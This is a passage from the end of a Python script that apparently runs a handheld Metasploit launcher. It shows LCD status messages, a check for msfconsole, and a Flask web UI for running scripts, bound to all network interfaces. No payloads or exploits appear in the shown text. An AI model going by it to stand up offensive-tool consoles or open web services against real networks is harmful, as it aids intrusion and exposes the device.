                d.text((4,80), "Use web UI to", font=font_sm, fill="#FF8888")
                d.text((4,92), "run scripts", font=font_sm, fill="#FF8888")
                LCD.LCD_ShowImage(img,0,0)
                time.sleep(1.5)
        time.sleep(0.1)

# ----------------------------------------------------------------------
# Main
# ----------------------------------------------------------------------
def main():
    # Regenerate scripts every time (to ensure all are present)
    generate_scripts()
    # Check msfconsole
    if os.system("which msfconsole >/dev/null 2>&1") != 0:
        print("Metasploit not found. Please install metasploit-framework.")
        if HAS_HW:
            img = Image.new("RGB", (W,H), "black")
            d = ImageDraw.Draw(img)
            d.text((4,40), "Metasploit missing", font=font_sm, fill="red")
            d.text((4,55), "sudo apt install", font=font_sm, fill="white")
            d.text((4,70), "metasploit-framework", font=font_sm, fill="white")
            LCD.LCD_ShowImage(img,0,0)
            time.sleep(5)
        return

    if HAS_HW:
        threading.Thread(target=lcd_loop, daemon=True).start()
        app.run(host='0.0.0.0', port=PORT, debug=False, use_reloader=False)
    else:
        app.run(host='0.0.0.0', port=PORT, debug=False)

if __name__ == "__main__":
    try:
        import qrcode
    except ImportError:
        os.system("pip install qrcode pillow")
    main()
